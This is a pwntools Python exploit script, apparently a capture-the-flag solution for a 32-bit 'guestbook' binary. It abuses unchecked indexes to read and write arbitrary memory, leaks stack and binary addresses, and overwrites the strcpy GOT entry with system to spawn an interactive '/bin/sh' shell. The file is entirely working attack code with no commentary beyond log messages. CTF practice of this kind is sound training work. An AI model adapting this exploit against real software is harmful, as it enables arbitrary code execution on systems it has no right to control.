from pwn import *

import struct

import re

context(arch='i386', os='linux')

b_main = ELF('./guestbook')
b_libc = ELF('./libc.so.6')
b_libc = ELF('/lib32/libc.so.6')

# p = gdb.debug('./guestbook', '''
# set follow-fork-mode parent
# continue
# ''')
p = process(['./guestbook'])
#p = remote('guestbook.tuctf.com', 4545)

p.send('AAAA\n')
p.send('BBBB\n')
p.send('/bin/sh\n')
p.send('DDDD\n')


def read_index(index):
   p.send('1\n')

   p.recvline_contains('view?', timeout=1)
   p.clean()

   p.send(str(index) + '\n')

   tmp = p.recvline()[:4]

   try:
       return u32(tmp)
   except:
       log.warn('Target value contains NULL byte')
       return 0


def write_index(index, value):
   p.send('2\n')
   p.send(str(index) + '\n')
   p.send(p32(value) + '\n\n')

   p.recvline_contains('change?', timeout=1)
   p.clean()


def store_addr(address):
   write_index(6, address)


def read_addr(address):
   store_addr(address)
   return read_index(0)


def write_addr(address, value):
   store_addr(address)
   write_index(0, value)


# leak stack

argv0_addr = read_index(14)
log.info('leaked argv[0] address:' + hex(argv0_addr))

sentinel_addr = None
sequential_nulls = 0
skip_addrs = 0
for addr in range(argv0_addr - 0x200, argv0_addr - 0x2000, -4):
   if skip_addrs > 0:
       skip_addrs -= 1
       continue

   print(hex(addr))
   val = read_addr(addr)
   if val == 0:
       sequential_nulls += 1
       if sequential_nulls == 6:
           skip_addrs += 100
           sequential_nulls = 0
   else:
       sequential_nulls = 0

   if 0xa500000 < val < 0xa700000:
       sentinel_addr = addr
       break

if not sentinel_addr:
   log.warn('Could not find sentinel')

log.info('Found sentinel: ' + hex(sentinel_addr))

main_addr = read_addr(sentinel_addr + 148)

log.info('Found main address: ' + hex(main_addr))

bin_base_addr = main_addr - b_main.symbols['main']

log.info('Found binary base address: ' + hex(bin_base_addr))

strcpy_got_addr = bin_base_addr + b_main.got['strcpy']

log.info('Found strcpy GOT address: ' + hex(strcpy_got_addr))

strycopy_addr = read_addr(strcpy_got_addr)

log.info('Found strcpy address: ' + hex(strycopy_addr))

system_got_addr = bin_base_addr + b_main.got['system']

log.info('Found system GOT address: ' + hex(system_got_addr))

system_addr = read_addr(system_got_addr)

log.info('Found system address: ' + hex(system_addr))

write_addr(strcpy_got_addr, system_addr)

p.send('2\n')
p.send('2\n')
p.send('XXXX\n\n')

p.clean()

# make connection interactive
p.interactive()
